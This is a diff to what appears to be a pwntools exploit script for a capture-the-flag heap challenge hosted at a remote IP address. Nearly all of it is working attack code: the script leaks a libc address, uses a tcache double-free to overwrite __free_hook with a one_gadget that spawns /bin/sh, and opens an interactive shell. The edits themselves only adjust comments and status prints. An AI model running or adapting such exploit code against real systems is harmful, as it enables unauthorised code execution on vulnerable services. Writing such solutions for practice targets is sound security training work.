@@ -15,6 +15,7 @@ def start(gdbscript="",argv=[], *a, **kw):
 #io = start("""b main;continue""")
 io = remote("20.55.48.101", 1339)
 
+# Nice way to make sure we are back to the main menu
 prompt = b"5. Exit\n"
 
 def action(mode, answers):
@@ -38,7 +39,7 @@ action(10, [b"hckk"]) #M4
 
 print("[1] Libc address:", hex(libc.address))
 
-# tcache dup to access __malloc_hook
+# tcache dup to access __free_hook
 action(1, [b"Hello"]) #m5
 action(1, [b"Hello2"]) #m6
 action(2, [b"5"])
@@ -49,6 +50,7 @@ action(3, [b"6", p64(libc.sym["__free_hook"]), ])
 action(1, [b"fill"]) #m7
 
 
+# From the output of one_gadget
 """
 0x10a737 posix_spawn(rsp+0x64, "/bin/sh", rdx, 0, rsp+0x70, r9)
 constraints:
@@ -60,11 +62,13 @@ constraints:
 gadget = libc.address + 0x10a737
 print("Gadget address:", hex(gadget))
 action(1, [p64(gadget)]) #m8
+print("[2] Hook now points to gadget")
+
+print("[3] ret2libc")
+
 # trigger the hook
-#action(4, [b"7"]) #view
+#action(4, [b"7"]) # view doesn't change the exploit
 #action(2, [b"7"])
 
-# replace __malloc_hook with onegadget
-print("[3] Ret2Libc")
-
 io.interactive()
+
